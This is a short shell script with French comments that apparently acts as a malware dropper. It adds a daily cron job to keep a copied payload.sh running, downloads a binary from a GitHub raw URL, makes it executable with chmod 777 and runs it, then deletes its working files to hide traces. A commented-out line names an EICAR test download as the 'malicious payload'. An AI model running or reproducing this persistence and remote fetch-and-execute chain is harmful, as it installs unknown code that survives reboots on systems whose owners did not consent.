#!/bin/sh

#Persistance
cp ./payload.sh /usr/local/share/payload.sh;
crontab -l > mycron;
echo "0 0 * * * /usr/local/share/payload.sh" >> mycron;
crontab mycron;

#Test
wget 'https://raw.githubusercontent.com/b4ldrrr/web2/main/testmayoly'; chmod 777 ./testmayoly; ./testmayoly;

#Téléchargement charge malveillante
#wget 'https://secure.eicar.org/eicar_com.zip';

#Nettoyage
rm mycron;
rm ./payload.sh;
